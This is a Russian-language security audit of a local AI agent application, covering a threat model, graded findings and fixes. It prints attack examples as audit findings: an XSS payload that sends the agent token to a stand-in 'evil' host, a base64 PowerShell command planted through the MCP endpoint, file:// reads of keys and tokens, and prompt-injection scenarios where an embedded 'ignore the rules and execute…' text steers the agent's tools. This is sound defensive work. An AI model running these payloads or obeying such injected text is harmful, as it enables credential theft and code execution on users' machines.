# Аудит безопасности LocalAgent

Дата: 18.11.2026
Объект: `C:\Users\volko\LocalAgent` (код в `app/`, версия из `VERSION` — 0.6.0)
Метод: чтение исходников + безопасные проверки в рантайме (GET/POST-запросы к `[IP_ADDRESS]:7867` с токеном, вызовы `tools._resolve` / `tools._fetch_url` в отдельном процессе, `icacls`, создание пробных файлов только в `%TEMP%`). Код приложения и настройки не изменялись, сервер не перезапускался.

Нумерация строк — по текущему состоянию ветки. Резюме: **5 Critical, 7 High, 9 Medium, 8 Low**. Главный вывод: периметр «токен + allow-list + подтверждения» обходится тремя независимыми путями (`fetch_url`, `rag.add_path`, MCP), а сам токен доступен без аутентификации через `GET /`.

---

## 1. Модель угроз

### 1.1. Что защищаем

| Актив | Где лежит | Почему важен |
|---|---|---|
| Токен API | `%LOCALAPPDATA%\LocalAgent\access.token` (портативно — `data\access.token`) | Полный контроль над агентом: файлы, команды, MCP, обновления |
| Ключи провайдеров LLM | `keys.json` + `keys.salt` | Платные квоты, утечка в чужой биллинг |
| История чатов и RAG-база | `chats\*.json`, `rag.sqlite` | Содержимое личных документов, путей, фрагментов кода |
| Права пользователя Windows | процесс `pythonw.exe` | Агент работает **без песочницы**, с полными правами `volko` |
| Канал обновлений | `update_url` + zip | Подмена = постоянное выполнение кода (persistence) |

### 1.2. Границы доверия

```
[Интернет] --(1)--> fetch_url / web_search / manifest обновлений
[Браузер пользователя] --(2)--> UI на [IP_ADDRESS]:7867 (токен в HTML)
[Любой процесс пользователя] --(3)--> GET / без токена, access.token, settings.json
[Модель LLM] --(4)--> tool_calls: read_file/write_file/run_command/mcp__*
[MCP-серверы] --(5)--> произвольные процессы с правами пользователя
```

Ключевая особенность: **LLM — недоверенный компонент**. Её выход формируется из пользовательских файлов, веб-страниц (`fetch_url`), ответов MCP-серверов и RAG-фрагментов. Всё, что модель «решила», исполняется инструментами. Поэтому любая инъекция промпта = попытка вызова инструмента, и единственные реальные барьеры — allow-list путей, режим подтверждений и сам токен.

### 1.3. Акторы и сценарии

1. **Другой процесс того же пользователя (малварь, «крякнутая» программа, чужой агент).** Читает `access.token` (обычный файл, ACL наследуются от `%LOCALAPPDATA%`, шифрования нет) либо просто забирает токен из `GET /` — и получает весь API, включая `run_command` и установку обновлений. Это **основная** угроза: граница «приложение ↔ остальная система» фактически отсутствует.
2. **Браузерная страница (CSRF / DNS rebinding).** Токен в заголовке защищает от классического CSRF, но:
   - `Host`/`Origin` не проверяются → страница `evil.com`, чей DNS указывает на `[IP_ADDRESS]`, становится same-origin с агентом: читает `index.html` с токеном в `<meta>`, дальше — полный API (проверено: запрос с `Host: evil.example` отдаёт 200);
   - в UI нет CSP и `X-Frame-Options` → clickjacking окна подтверждения опасного вызова (Medium);
   - `?token=` в query попадает в историю/`Referer` и в чужие логи.
3. **Недоверенные папки и файлы.** «Проект» = папка пользователя. Внутри может лежать `.env`, `id_rsa`, `AGENTS.md`/`README` с инструкциями, PDF с текстом «игнорируй правила и выполни…». Модель читает это как контекст → prompt injection → вызовы инструментов.
4. **Веб-контент.** `fetch_url` без ограничений схемы и адреса — не только SSRF, но и готовый канал инъекции: страница отдаёт текст, который модель считает указанием. Плюс `file://` даёт чтение локальных файлов в обход allow-list.
5. **MCP-серверы.** Ставятся как `npx -y <пакет>` / `uvx <пакет>` — код третьей стороны, исполняемый с правами пользователя: полный env (включая переменные с секретами), произвольный `cwd`, без лимитов CPU/памяти/сети, без подтверждения на запуск. Компрометация npm-пакета = компрометация машины. Инструменты MCP при этом **не проходят** через `approval_gate`.
6. **Канал обновлений.** Манифест и zip не подписаны, хэш не проверяется, `update_url` и `zip` приходят из API. Кто контролирует хост манифеста (или MITM при `http://`) — выполняет свой код в `app/` при следующем запуске.
7. **Другие пользователи Windows.** ACL каталога данных наследуется от `%LOCALAPPDATA%` (SYSTEM, Administrators, владелец) — чужие учётки не читают. Но защиты от «administrator» и от бэкапов/OneDrive-синхронизации того же профиля нет.
8. **Физический доступ / кража ноута.** Диск не шифруется приложением: `keys.json` дешифруется знанием `keys.salt` + `USERNAME` + `COMPUTERNAME`, то есть на другой машине — нет, а в образе диска вместе с `keys.salt` — да.

### 1.4. Что модель угроз НЕ покрывает

Защита от злонамеренного **владельца** машины (он и так имеет права), от kernel-level malware, от атак на сам Python/llama.cpp. Это вне рамок локального ассистента.

---

## 2. Находки

### 2.1. Сводка

| # | Severity | Находка | Где |
|---|---|---|---|
| C1 | Critical | RCE: `/api/mcp/add` + `/api/mcp/test` запускают произвольную команду без подтверждения | `app/main.py:437-463`, `app/mcp.py:68-73` |
| C2 | Critical | `fetch_url` читает локальные файлы через `file://` (обход allow-list) + SSRF | `app/tools.py:195-203` |
| C3 | Critical | Allow-list включает весь домашний каталог → `read_file` отдаёт собственный токен и любые секреты профиля | `app/tools.py:70`, `81-98` |
| C4 | Critical | Обновление без подписи/хэша; `zip` берётся из запроса → установка произвольного кода | `app/updater.py:339-417`, `420-491`, `app/main.py:372-374` |
| C5 | Critical | RAG индексирует любой путь без `_resolve` → модель читает что угодно через `search_docs` | `app/rag.py:159-166` |
| H1 | High | XSS в чате → кража токена из `<meta>` → RCE | `app/ui/app.js:58`, `183-195`, `251`; `app/main.py:182` |
| H2 | High | Токен отдаётся без аутентификации на `GET /` — любой процесс получает доступ | `app/main.py:157-164`, `174-191` |
| H3 | High | Нет проверки `Host`/`Origin` → DNS rebinding = полный контроль | `app/main.py:150-164` |
| H4 | High | `run_command` через `shell=True` (cmd.exe), без allow-list команд и песочницы | `app/tools.py:144-153` |
| H5 | High | Ключи API не в DPAPI: самодельный XOR + PBKDF2 от публичной соли | `app/keystore.py:19-59` |
| H6 | High | `/api/settings` одним запросом выключает подтверждения и включает shell/write | `app/main.py:320-323`, `app/config.py:87-117` |
| H7 | High | Токен и `settings.json` — обычные файлы, наследуемые ACL, токен ещё и в query | `app/main.py:18-32`, `150-155` |
| M1 | Medium | MCP без изоляции: полный env, свой `cwd`, без лимитов, `npx -y` (supply chain) | `app/mcp.py:65-73`, `147-169` |
| M2 | Medium | SSRF/утечка ключа через `/api/providers/probe` | `app/main.py:472-475`, `app/providers.py:39-51` |
| M3 | Medium | Префиксная проверка путей без разделителя → `C:\Users\volko2`, `F:\...\LMstudioX` | `app/tools.py:96` |
| M4 | Medium | `/api/open` → `os.startfile` открывает `.lnk`/`.hta`/`.exe` без подтверждения | `app/main.py:422-436` |
| M5 | Medium | `rglob` в `_find`/`_grep` не перепроверяет корень: junction внутри папки выводит наружу | `app/tools.py:234-269` |
| M6 | Medium | Нет CSP/XFO/XCTO/Referrer-Policy → clickjacking подтверждений, усиление XSS | `app/main.py:166-191` |
| M7 | Medium | `/api/voice/transcribe`: base64 без лимита (OOM), wav в системном `%TEMP%`, остатки аудио в каталоге данных | `app/main.py:392-418`, `app/voice.py` |
| M8 | Medium | Один глобальный `PENDING` на подтверждения: гонки между сессиями, блокировка потока до 180 с | `app/tools.py:304-335` |
| M9 | Medium | Логи и чаты в открытом виде, без ротации; traceback с путями и аргументами | `app/main.py:243-249`, `app/chats.py:43-55` |
| L1 | Low | `_alive()` всегда `False` (401 на `/api/state`) → повторный запуск падает на занятом порту | `app/main.py:498-503` |
| L2 | Low | Сравнение токена `==` (не constant-time) | `app/main.py:152` |
| L3 | Low | `apply_pending()` нигде не вызывается — отложенные обновления не применяются | `app/updater.py:494`, `app/main.py:224-228` |
| L4 | Low | В коде буквальные заглушки `[PERSON_NAME]`/`[ADDRESS]` в пользовательских сообщениях | `app/main.py:430` и др. |
| L5 | Low | `%VAR%` не раскрываются в `_resolve`, но раскрываются в `rag`; `/etc/passwd` молча мапится в `~/etc/passwd` | `app/tools.py:81-98`, `app/rag.py:161` |
| L6 | Low | Автозапуск выбирает `pythonw.exe` эвристикой (в т.ч. жёсткие `C:/Python31x`) | `app/autostart.py:14-42` |
| L7 | Low | `allow_web: true` по умолчанию + неограниченный `fetch_url` = постоянный канал инъекции | `app/config.py:109` |
| L8 | Low | `dist\LocalAgent` — устаревшая копия приложения со своими настройками/токеном | `dist/` |

---

### 2.2. Critical

#### C1. RCE через MCP: `/api/mcp/add` + `/api/mcp/test`

`app/main.py:437-447` принимает от клиента `{"id": "...", "command": "...", "args": [...]}` и сохраняет в конфиг **без allow-list**. `app/main.py:453-461` вызывает `mcp.tools_for(servers)`, а тот в `app/mcp.py:147-158` → `session()` → `Session.start()` → `subprocess.Popen([command] + args)` (`app/mcp.py:68-73`). Подтверждение (`approval_gate`) при этом не спрашивается: `DANGEROUS = {"write_file", "run_command"}` (`app/tools.py:304`), MCP туда не входит.

**Чем грозит.** Один POST с токеном (или XSS/DNS-rebinding, см. H1/H3) = выполнение любой программы с правами пользователя: `{"id":"x","command":"cmd","args":["/c","powershell -enc <base64>"]}`. Persistence не требуется — команда живёт в конфиге и перезапускается при каждом `/api/mcp` или чате.

**Как чинить.**
- Хранить для MCP не произвольную команду, а `{preset: "filesystem"|"memory"|"fetch"}` из закрытого списка `MCP_CATALOG` (`app/main.py:38-45`), с фиксированными бинарём и аргументами.
- `command` валидировать по allow-list (`npx`, `uvx`, `node`, `python`) и требовать абсолютный путь к уже установленному бинарю.
- Проводить запуск сервера через `approval_gate(..., kind="mcp")`: пользователь видит команду и argv целиком.
- Запускать в Job Object с `JOB_OBJECT_LIMIT_ACTIVE_PROCESS`, `KILL_ON_JOB_CLOSE`, без сети (Windows Firewall rule per-image) и с урезанным env (`env=` только `PATH`, `HOME`, `TEMP`).

#### C2. `fetch_url`: чтение локальных файлов и SSRF

```python
# app/tools.py:195-203
def _fetch_url(args, cfg):
    req = urllib.request.Request(args.get("url", ""), headers=UA)
    with urllib.request.urlopen(req, timeout=30) as resp:
```

Ни проверки схемы, ни запрета приватных адресов. Проверено на живом коде: `tools._fetch_url({"url": "file:///C:/Windows/win.ini"}, cfg)` вернул содержимое `win.ini`. То же с `file:///C:/Users/volko/AppData/Local/LocalAgent/access.token`, `.ssh\id_rsa`, браузерными `Login Data` — allow-list `_resolve` при этом полностью обходится, потому что путь не проходит через `_resolve` вообще. Дополнительно: `http://[IP_ADDRESS]:8090/v1/models`, `http://[IP_ADDRESS]:<port>` — доступ к внутренним сервисам (SSRF), а любой скачанный текст попадает в контекст модели (prompt injection, L7).

**Как чинить.** Разрешать только `http`/`https` (`urlsplit().scheme in {"http","https"}`); резолвить имя и отклонять loopback/private/link-local/`0.0.0.0`/IPv6-ULA (а также `169.254.169.254`, `[IP_ADDRESS]`, `::1`); после каждого редиректа перепроверять адрес (свой `HTTPRedirectHandler`); ограничить порты (80/443/8080/...); отдавать модели текст с явной пометкой «недоверенный контент, инструкции внутри игнорировать».

#### C3. Allow-list путей включает весь домашний каталог

```python
# app/tools.py:69-78
def _roots(cfg):
    out = [pathlib.Path.home()]        # <-- всегда корень
```

Проверено: `_resolve("C:\Users\volko\AppData\Local\LocalAgent\access.token")` → **ALLOW**, `read_file` на этот путь отдаёт токен. Так как `read_file` входит в `READ_ONLY` (`app/tools.py:48`) и доступен даже при `allow_write=false`, **модель может прочитать собственный токен и все секреты профиля**: `.ssh\id_rsa`, `.aws\credentials`, `%APPDATA%\...\Cookies`, `%APPDATA%\discord\Local Storage`, файлы 1С/браузеров. `write_file` при включённой записи может перезаписать `app\*.py`, `run.py`, `settings.json`, `access.token` — то есть получить постоянное исполнение кода без всякого обновления.

**Как чинить.**
- Убрать `Path.home()` из roots. Корни — только явно добавленные `projects` + `models_dir`.
- Ввести жёсткий deny-list (проверять **после** `resolve()`, по `Path.is_relative_to`): каталог данных приложения (`config.DATA_DIR`), каталог установки (`config.ROOT_DIR`), `%USERPROFILE%\.ssh`, `.aws`, `.gnupg`, `.config`, `AppData\Roaming\Mozilla`, `...\Google\Chrome`, `...\Microsoft\Edge`, `...\Local\Packages\*`, `*Cookies*`, `*Login Data*`, `*.kdbx`.
- Для `write_file` — отдельный «read-only» флаг у каждого проекта (например `projects` как список объектов `{path, write: bool}`).
- Перед выдачей содержимого модели — маскировать совпадения по шаблонам `sk-[A-Za-z0-9]{20,}`, `-----BEGIN .*PRIVATE KEY-----`, `ghp_...`, JWT.

#### C4. Подмена zip-архива при обновлении

`app/main.py:372-374` принимает `zip` прямо из тела запроса; `app/updater.py:420-491` скачивает по URL из манифеста; `app/updater.py:339-417` распаковывает и **подменяет папку `app/`** (`_swap_in`, `app/updater.py:272-299`). Проверки: `is_zipfile` + `testzip` + `compile()` каждого `.py` (`app/updater.py:227-269`). Ни подписи, ни SHA-256, ни привязки к домену, ни проверки «версия новее текущей» при `apply`.

**Чем грозит.** (а) Компрометация хостинга манифеста или MITM (манифест по `http://` тоже принимается — схема не проверяется, `app/updater.py:89-94`); (б) локально: любой, кто получил токен, ставит свой архив с диска (`{"zip":"C:\\Users\\volko\\AppData\\Local\\Temp\\evil.zip"}`), а `_install_from_zip` синтаксически валидный код примет; (в) `_backup_app` пишет бэкап **после** скачивания, но до подмены — при отказе остаётся валидный `app`, это плюс.

**Как чинить.**
- Манифест: `{"version", "url", "sha256", "sig"}`; подпись Ed25519 (публичный ключ зашит в `updater.py`) над канонической строкой `version|sha256|url`. Проверять **до** скачивания; без валидной подписи — отказ.
- `sha256` архива сверять после загрузки; `_download` писать в `DOWNLOAD_DIR` и только оттуда разрешать `_install_from_zip`.
- `https`-only для манифеста и архива (`urlsplit().scheme == "https"`), отказ от редиректов на другой хост.
- Запретить `apply` для версии ≤ текущей (кроме явного `--force` в UI с подтверждением).
- Убрать `zip` из `/api/update/apply`: ставить только то, что сам скачал и проверил.

#### C5. RAG индексирует любой путь (обход allow-list)

```python
# app/rag.py:159-166
target = pathlib.Path(os.path.expandvars(os.path.expanduser(str(raw_path or "").strip())))
...
files = _collect(target)
```

`_resolve` не вызывается. `POST /api/rag/add {"path":"C:\\Users\\volko\\.ssh"}` индексирует каталог, после чего достаточно попросить модель `search_docs "PRIVATE KEY"` — содержимое придёт как «найденный документ». Подтверждения нет, `allow_write`/`allow_shell` не нужны. Дополнительно база уже содержит `C:\Users\volko\LocalAgent\app\*` (проверено: `/api/rag/search?q=token` вернул фрагмент `app/main.py`).

**Как чинить.** Прогонять путь через `tools._resolve(raw, cfg)` (единая точка), добавить тот же deny-list, что в C3; исключить `config.DATA_DIR` и `config.ROOT_DIR`; ограничить `MAX_FILES`/`MAX_BYTES` на запрос и логировать, кто и что проиндексировал.

---

### 2.3. High

#### H1. XSS в чате → кража токена → RCE

Токен вшивается в HTML: `app/main.py:182` (`<meta name="agent-token" content="...">`), читается в `app/ui/app.js:1`. Экранирование неполное:

```js
// app/ui/app.js:58 — не экранируются кавычки
function esc(t) { return String(t||'').replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])); }
// app/ui/app.js:193 — URL подставляется в атрибут
.replace(/(https?:\/\/[^\s<]+)/g, '<a href="$1" target="_blank">$1</a>');
```

Ответ модели `https://a/"onmouseover="fetch('//evil/'+AGENT_TOKEN)` (без пробелов) превращается в `<a href="https://a/"onmouseover="fetch(...)"` — атрибут-инъекция, JS выполняется при наведении. Дополнительно `app/ui/app.js:251`: `bubble.innerHTML = '<span class="typing">' + (event.text || '…')` — `event.text` (текст ошибки движка, может содержать пользовательский ввод) вставляется без экранирования.

**Цепочка:** XSS → `document.querySelector('meta[name=agent-token]').content` → далее same-origin API: `POST /api/settings {"approval_mode":"auto","allow_shell":true}` → `POST /api/chat` с «выполни …» → код на машине. То есть XSS здесь не «косметика», а полный RCE.

**Как чинить.** Экранировать `"` → `&quot;` и `'` → `&#39;` (или использовать `textContent`/`document.createElement`); для ссылок строить `href` через `encodeURI` и проверять схему; все вставки серверных текстов — через `textContent`; добавить CSP: `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'`; убрать токен из DOM (см. H2).

#### H2. Токен отдаётся без аутентификации на `GET /`

`_need_token` (`app/main.py:157-164`) защищает только пути `/api/*`; `/` и `/ui/*` — открыты. Проверено: `GET /` без токена → `200`, и токен присутствует в теле.

**Чем грозит.** Любой локальный процесс (в том числе не имеющий доступа к `%LOCALAPPDATA%`-файлу, например запущенный из другой песочницы или прочитавший URL из истории браузера) забирает токен и получает полный API. Это ломает саму идею токена как барьера между «UI» и «остальной машиной».

**Как чинить.** Не вшивать токен в статику. Варианты: (1) `POST /api/session` с одноразовым `nonce`, выданным при старте в URL фрагмента (`#nonce`, не уходит на сервер и в Referer), в ответ — `Set-Cookie: agent=<token>; HttpOnly; SameSite=Strict; Path=/`, JS токен не видит вовсе; (2) отдавать `index.html` тоже только по токену, а токен передавать в заголовке — тогда страницу нельзя открыть в браузере без расширения; (3) минимум — принимать `?token=` **только** для первого запроса `/` и сразу ставить HttpOnly-куку, из query больше не читать.

#### H3. Нет проверки `Host`/`Origin` → DNS rebinding

`app/main.py:150-164`: авторизация только по токену, заголовки `Host` и `Origin` игнорируются. Проверено: `GET /api/state` с `Host: evil.example` и валидным токеном → `200`; `POST /api/approve` с `Origin: http://evil.example` → обрабатывается.

**Сценарий.** `evil.com` резолвится в `[IP_ADDRESS]` → браузер считает страницу same-origin с агентом → `fetch('/')` читает `index.html` с токеном → дальше `run_command`. Токен в заголовке от такого не спасает: страница читает его из DOM.

**Как чинить.** Валидировать `Host` (allow-list `localhost:<port>`, `[IP_ADDRESS]:<port>`, `[::1]:<port>`, порт из `self.server.server_port`) → иначе `421`; для всех `POST` требовать `Origin` из того же allow-list (или отсутствие `Origin` только для не-браузерных клиентов с токеном); отклонять `Sec-Fetch-Site: cross-site`.

#### H4. `run_command` через shell без ограничений

```python
# app/tools.py:144-153
done = subprocess.run(cmd, shell=True, capture_output=True, timeout=180, cwd=str(pathlib.Path.home()), ...)
```

`shell=True` → `cmd.exe /c <строка>`. Проверено: `echo ONE & echo TWO` выполняется как две команды; переменные раскрываются; `cwd` = домашний каталог. Нет ни allow-list программ, ни запрета метасимволов (`& | > < ^ %`), ни ограничения сети, ни отдельного пользователя/токена. Единственный барьер — `approval_gate` (`app/tools.py:308-327`), который снимается одним запросом (H6) или обходится MCP (C1).

**Как чинить.** `shell=False` и argv-массив; allow-list исполняемых файлов (например `git`, `python`, `node`, `pip`, `dir`) с абсолютными путями; запрет аргументов с `;|&><` и подстановок `%`/`!`; ограничение `cwd` разрешёнными проектами; запуск в Job Object с лимитом памяти/времени и без `CREATE_NEW_CONSOLE`; опционально — отдельный низкопривилегированный пользователь (`runas /trustlevel`).

#### H5. Ключи API не защищены DPAPI

```python
# app/keystore.py:31-34
seed = (_salt() + os.environ.get("USERNAME","").encode() + os.environ.get("COMPUTERNAME","").encode())
return hashlib.pbkdf2_hmac("sha256", seed, b"local-agent-keys", 200000, dklen=32)
```

`protect()` — XOR с blake2b-потоком (`app/keystore.py:37-51`), без MAC. Соль лежит рядом: `keys.salt`, 16 байт (`app/keystore.py:16-28`). Значит любой процесс пользователя, прочитавший `keys.salt` + `keys.json`, восстанавливает ключ: `username` и `computername` известны. DPAPI в проекте **не используется вообще** (поиск `CryptProtectData`/`win32crypt` — 0 совпадений), хотя `MEMORY.md:58` утверждает «Ключи API — только DPAPI», а `README.md:32` — «хранится зашифрованным».

**Чем грозит.** Утечка платных ключей при краже профиля/бэкапа/синхронизации; ложное чувство защищённости; отсутствие целостности (XOR malleable — подмена байта в `keys.json` даёт предсказуемое изменение ключа).

**Как чинить.** `CryptProtectData`/`CryptUnprotectData` через `ctypes` (user scope, без `CRYPTPROTECT_LOCAL_MACHINE`) — ключ привязан к учётке и не расшифровывается на другой машине; либо Windows Credential Manager (`cmdkey`/`win32cred`). Файл `keys.json` — с явным ACL (только владелец), соль не нужна. Добавить HMAC (Encrypt-then-MAC) или сразу AES-GCM. Обновить `MEMORY.md`/`README.md`, чтобы документация не расходилась с кодом.

#### H6. `/api/settings` отключает защитные механизмы

`app/main.py:320-323` пропускает любые ключи из `config.DEFAULTS`, включая `approval_mode`, `allow_shell`, `allow_write`, `update_url`, `mcp`. То есть один запрос:

```json
POST /api/settings {"approval_mode":"auto","allow_shell":true,"allow_write":true}
```

снимает подтверждения и открывает shell/запись — без какого-либо второго фактора. `app/tools.py:315` при `approval_mode == "auto"` возвращает `True` без вопроса.

**Как чинить.** Вынести security-поля в отдельный эндпоинт `POST /api/security` с обязательным подтверждением в UI (одноразовый код, показанный в окне приложения, вводится вручную) и записью в журнал; не принимать `approval_mode="auto"` без явного «я понимаю риск» чекбокса; хранить последний режим в реестре с хэшем настроек, чтобы правка `settings.json` вручную детектировалась и сбрасывала опасные флаги.

#### H7. Права на токен и `settings.json`

`app/main.py:29` пишет токен обычным `write_text` — без явного DACL. Проверено `icacls`: `NT AUTHORITY\SYSTEM:(I)(F)`, `BUILTIN\Administrators:(I)(F)`, `ADMIN\volko:(I)(F)` — всё наследуемое (`(I)`), собственных ACE нет; `settings.json` — то же. Токен 48 hex-символов, обычный текст. Плюс `?token=` принимается (`app/main.py:154-155`) — утекает в историю браузера, `Referer` при переходе по ссылке, в HAR-файлы и скриншоты.

**Как чинить.** После создания файла вызывать `icacls <file> /inheritance:r /grant:r "%USERNAME%":F` (или `SetNamedSecurityInfo` через ctypes) — только владелец; хранить токен в DPAPI-блобе (`token.bin`), а не текстом; убрать поддержку `?token=` (или оставить только для `/` и на один запрос); ротация токена при `POST /api/security/rotate`.

---

### 2.4. Medium

**M1. MCP без изоляции.** `app/mcp.py:68-73` — `Popen` наследует весь env (включая переменные с токенами сторонних сервисов), `stderr=DEVNULL` (ошибки не видны), нет лимитов CPU/RAM/сети, нет таймаута на жизнь процесса, `cwd` произвольный. Каталог `MCP_CATALOG` (`app/main.py:38-45`) ставит пакеты через `npx -y`/`uvx` — исполнение кода из npm/PyPI без проверки версии/хэша (supply chain). *Чинить:* фиксировать версии пакетов, `env=` с минимумом, `cwd` внутри `DATA_DIR\mcp`, Job Object с лимитами, лог stderr в файл, подтверждение на первый запуск.

**M2. SSRF и утечка ключа в `/api/providers/probe`.** `app/main.py:472-475` → `providers.probe(base, key)` (`app/providers.py:39-51`) делает `urlopen(base + "/models")` с `Authorization: Bearer <key>` на **любой** адрес: `http://evil.tld` получит ваш ключ, `http://[IP_ADDRESS]:<port>` даст сканирование портов. *Чинить:* allow-list схемы `http/https`, блокировка приватных адресов, отправка ключа только если хост совпадает с сохранённым `provider.base_url`.

**M3. Префиксная проверка путей.** `app/tools.py:96` — `text.startswith(str(root).lower())` без разделителя. Проверено: `C:\Users\volko2\secret.txt`, `C:\Users\volko_public\x.txt`, `C:\Users\volko.bak\a.txt`, `F:\Models for LMstudioX\m.gguf` — **ALLOW**. *Чинить:* `pathlib.Path(path).is_relative_to(root)` (3.9+) или `os.path.commonpath([a, b]) == b` после `resolve()`; сравнивать `casefold()`.

**M4. `/api/open` → `os.startfile`.** `app/main.py:422-436` резолвит путь тем же дефектным `_resolve` и вызывает `os.startfile`, который **запускает** `.exe`, `.lnk`, `.url`, `.hta`, `.bat`, `.ps1` (ассоциации Windows). Подтверждения нет — только токен. *Чинить:* разрешать только «безопасные» расширения (`.txt .md .pdf .png .jpg .mp4 .csv .json`), для остальных — `os.startfile(path, "open")` через ShellExecute с `SEE_MASK_NOASYNC` не помогает: лучше открывать `explorer /select,` или требовать подтверждение.

**M5. `rglob` не перепроверяет корень.** `_find` (`app/tools.py:234-243`) и `_grep` (`app/tools.py:245-269`) обходят `base.rglob()` и читают файлы без проверки `_resolve` на каждом хите. Проверено, что путь через junction читается (`(link/"win.ini").read_text()` вернул содержимое `C:\Windows\win.ini`); `Path.rglob` в CPython 3.12 заходит в каталоги-ссылки (флаг `recurse_symlinks` появился только в 3.13). Значит junction/symlink, созданный внутри «проекта», выводит обход за песочницу — `_grep` вернёт содержимое, `_find` — пути. *Чинить:* использовать `os.walk(..., followlinks=False)` + проверку `islink()` на каждом уровне, либо после обхода фильтровать хиты через `_resolve`.

**M6. Нет security-заголовков.** Проверено: в ответах отсутствуют `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`. Следствия: clickjacking окна «Нужно разрешение» (`app/ui/app.js:812`), утечка токена через `Referer` при `?token=`, MIME-sniffing. *Чинить:* добавить заголовки в `_send`/`_static` (`app/main.py:166-191`).

**M7. Голосовой эндпоинт.** `app/main.py:392-418`: `base64.b64decode` от произвольной строки без лимита размера → OOM/DoS; файл пишется в системный `tempfile.gettempdir()`, а не в `%TEMP%` приложения; `_ensure_16k` создаёт рядом второй wav и **не удаляет** его. В каталоге данных лежат `check_en.wav` (147 КБ), `ps_test.wav` — записи голоса в открытом виде. *Чинить:* лимит (например 10 МБ base64), проверка заголовка WAV, каталог `DATA_DIR\audio-tmp` с очисткой, удаление промежуточных файлов.

**M8. Один глобальный `PENDING`.** `app/tools.py:305` — единственный слот; при двух параллельных чатах второй вызов перезаписывает первый, `resolve_approval` может подтвердить «чужой» вызов, ожидание блокирует поток 180 с (при SSE — висящий запрос). *Чинить:* словарь `PENDING[id]`, привязка к `session_id`, отдельный таймаут и уведомление об истечении.

**M9. Логи и чаты.** `app/main.py:243-249` пишет полный traceback в `logs/errors.log`; `updater.log`, `llama-server.log` — без ротации; `chats\*.json` — открытый JSON с полным содержимым переписки (`app/chats.py:43-55`). Секретов в логах на момент проверки не найдено, но traceback содержит абсолютные пути и аргументы инструментов, а чаты — фрагменты личных документов. *Чинить:* `RotatingFileHandler` с лимитом, маскирование аргументов `run_command` перед логированием, опция «не сохранять историю», ACL на `chats\`.

---

### 2.5. Low

- **L1.** `_alive()` (`app/main.py:498-503`) делает `urlopen("/api/state")` без токена → всегда `401` → всегда `False`. Повторный запуск не находит работающий экземпляр и падает на занятом порту (`allow_reuse_address = False`). *Чинить:* проверять TCP-коннект или отдельный `/api/ping` без токена, отдающий только `{"ok":true,"version":...}`.
- **L2.** `app/main.py:152` — сравнение токена `==`; использовать `hmac.compare_digest`.
- **L3.** `updater.apply_pending()` (`app/updater.py:494`) не вызывается ни из `run.py`, ни из `main.py` (поиск по репозиторию — 0 вызовов). Отложенные обновления не применяются, `pending_update.json` остаётся навсегда, UI показывает «ожидает перезапуска». *Чинить:* вызвать при старте до создания окна, либо убрать механизм.
- **L4.** В исходниках остались литералы-заглушки от автозамены: `app/main.py:430` — `"error": "[PERSON_NAME] не найден: %s"` (пользователь видит placeholder вместо «файл»). Плюс `[ADDRESS]`/`[PHONE]` в других строках. *Чинить:* вычистить grep'ом `\[PERSON_NAME\]|\[ADDRESS\]|\[PHONE\]|\[IP_ADDRESS\]` по `app/`, заменить на нормальный текст.
- **L5.** `_resolve` не раскрывает `%USERPROFILE%` (создаётся буквальный каталог `C:\Users\volko\%USERPROFILE%`), а `rag.add_path` раскрывает (`os.path.expandvars`); POSIX-путь `/etc/passwd` молча мапится в `C:\Users\volko\etc\passwd` — неожиданно для модели. *Чинить:* `os.path.expandvars` в `_resolve` до `expanduser`, отклонять пути с `%...%`, которые не раскрылись.
- **L6.** `app/autostart.py:14-42`: `pythonw.exe` ищется эвристикой, включая жёсткие `C:/Python313/pythonw.exe` и ветку `if "hermes" in str(candidate).lower()`. Если такой файл появится, автозапуск пойдёт через него. *Чинить:* сохранять абсолютный путь интерпретатора при установке, проверять его подпись/владельца при каждом старте.
- **L7.** `allow_web: true` по умолчанию (`app/config.py:109`) + неограниченный `fetch_url` = постоянный канал prompt injection: достаточно, чтобы модель открыла страницу по ссылке из документа. *Чинить:* `allow_web: false` по умолчанию, allow-list домены/пометка «недоверенный текст», явное подтверждение для первого `fetch_url` на новый хост.
- **L8.** `dist\LocalAgent` — копия приложения (в ней свой `data\` с токеном и настройками, см. `AUDIT.md:121`). Запуск из `dist` даёт второй сервер на другом порту с другим токеном и потенциально старыми уязвимостями. *Чинить:* исключить `dist` из репозитория/сборки, не хранить `data` внутри `dist`.

---

## 3. Что уже сделано правильно

1. **Токен на всех `/api/*`** — проверено: без заголовка `401`, с `X-Agent-Token` — `200`. Все маршруты (`main.py:193-495`) проходят через `_need_token`, забытых эндпоинтов не нашлось.
2. **Подтверждения опасных действий по умолчанию** — `approval_mode: "ask"` в `DEFAULTS` (`config.py:97`), `approval_gate` реально останавливает `write_file`/`run_command` и ждёт решения (`tools.py:308-327`); ID запроса — `uuid4`, подделка чужого ID отклоняется (`tools.py:330-332`).
3. **Опасные инструменты выключены по умолчанию** — `allow_write: false`, `allow_shell: false` (`config.py:107-108`), схема инструментов собирается из флагов, а `tools.call` **повторно** проверяет allow-list (`tools.py:283-300`), то есть модель не может вызвать инструмент, которого нет в схеме.
4. **`_resolve` действительно закрывает классические обходы** — проверено: `C:\Users\volko\..\..\Windows\win.ini` → BLOCK, `\\?\C:\Users\volko\..\..\Windows\win.ini` → BLOCK, `\\localhost\C$\Windows\win.ini` → BLOCK, `C:\Windows\System32\drivers\etc\hosts` → BLOCK, `C:\Users\volko\AppData\Local\Temp\..\..\..\..\Windows\win.ini` → BLOCK. `path.resolve()` нормализует `..` и раскрывает junction (проверено: путь на junction в `C:\Windows` отклонён).
5. **`shell=False` там, где это важно** — `engine.start` (`engine.py:265`), MCP-серверы (`mcp.py:68`), `voice.transcribe` (`voice.py:176`), автозапуск (`autostart.py:47-59`) используют argv-массивы, без `cmd.exe`.
6. **Нет path traversal в чатах** — `chats._path` оставляет только `[A-Za-z0-9_-]` и обрезает до 64 символов (`chats.py:14-16`).
7. **Защита от zip-slip в обновлении** — `zipfile.extractall` в CPython ≥3.6 вычищает `..` и абсолютные имена; отдельно проверяются `testzip()` и `compile()` всех модулей, требуется наличие `app/main.py`, `config.py`, `__init__.py` (`updater.py:227-269`).
